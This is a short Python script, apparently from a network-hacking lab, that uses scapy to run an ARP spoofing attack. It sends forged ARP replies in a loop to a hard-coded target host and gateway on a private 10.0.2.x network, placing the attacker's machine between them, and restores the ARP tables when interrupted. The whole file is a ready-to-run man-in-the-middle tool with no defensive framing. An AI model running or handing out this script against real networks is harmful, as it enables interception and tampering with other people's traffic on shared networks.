#!/usr/bin/env python

# from scapy import *
import scapy.all as scapy
import time, sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # print(arp_request.show())
    # print(arp_request.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.show())
    # print(broadcast.summary())
    arp_request_broadcast = broadcast/arp_request
    # print(arp_request_broadcast.show())
    # print(arp_request_broadcast.summary())
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "10.0.2.129"
gateway_ip = "10.0.2.1"

packets_sent_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packets_sent_count += 2
        # print(f"\r[+] Packets sent: {packets_sent_count}", end="")
        print("\r[+] Packets sent: " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl+C ... Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
